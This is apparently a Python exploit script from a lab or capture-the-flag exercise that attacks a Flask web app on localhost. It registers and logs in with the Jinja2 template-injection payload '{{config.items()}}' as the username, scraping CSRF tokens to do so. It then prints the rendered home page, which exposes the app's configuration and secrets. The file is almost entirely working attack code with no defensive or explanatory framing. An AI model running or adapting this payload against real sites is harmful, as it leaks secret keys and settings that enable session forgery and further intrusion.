import requests
from bs4 import BeautifulSoup

s = requests.Session()
payload = "{{config.items()}}"

# Register payload
r = s.get("http://localhost:5000/register")
token = BeautifulSoup(r.text, "html.parser").find("input", {"id": "csrf_token"})['value']

r = s.post("http://localhost:5000/register", {"csrf_token": token, "username": payload, "password": "pass"})
print(f"Registering User: {r.text}")


# Login
r = s.get("http://localhost:5000/login")
token = BeautifulSoup(r.text, "html.parser").find("input", {"id": "csrf_token"})['value']

r = s.post("http://localhost:5000/login", {"csrf_token": token, "username": payload, "password": "pass"})
print(f"Resgistering User: {r.text}")


# Access
r = s.get("httP://localhost:5000/")
print(f"---- Result ----- \n{BeautifulSoup(r.text, 'html.parser').h1.text[7:]}")